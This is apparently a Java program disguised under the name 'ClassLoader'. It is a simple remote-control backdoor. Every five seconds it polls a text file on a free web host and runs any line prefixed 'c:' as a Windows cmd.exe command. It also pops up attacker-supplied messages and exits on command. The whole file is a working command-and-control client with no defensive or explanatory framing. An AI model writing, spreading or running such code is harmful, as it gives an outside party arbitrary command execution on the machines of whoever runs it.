import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class ClassLoader {

    public static String lastline = "";
    public static void main(String[] args) {
        // http://marshmallow.rf.gd/file.txt fetch


        // Open file

        // Timer every 5seconds
        Timer t = new Timer( );
        t.scheduleAtFixedRate(new TimerTask() {

            @Override
            public void run() {
                System.out.println("Checking for updates...");
                updateCMD();

            }
        }, 1000,5000);

    }

    public static void updateCMD() {
        String url = "https://tindour.000webhostapp.com/test.txt";
        try {
            BufferedReader br = new BufferedReader(new InputStreamReader(new URL(url).openStream()));
            String read = br.readLine(); //read line
            br.close();
                if (!read.equalsIgnoreCase(lastline)) {
                    lastline = read;
                    System.out.println("Executing: " + read);
                    //if its start with c:
                    if (read.startsWith("exit")) {
                        // run the command
                        System.exit(0);
                    }
                    if (read.startsWith("m:")) {
                        read = read.substring(2);
                        //
                        Runtime.getRuntime().exec("cmd.exe /K start cmd.exe /K \"@echo off & color a & echo " + read + "\"");
                    }
                    if (read.startsWith("c:")) {
                        read = read.substring(2);
                        System.out.println("> " + read);
                        Runtime.getRuntime().exec("cmd.exe /K \"" + read + "\"");

                    }

            }
        } catch (Exception e) {
            System.out.println("Error: " + e);
        }
    }
}
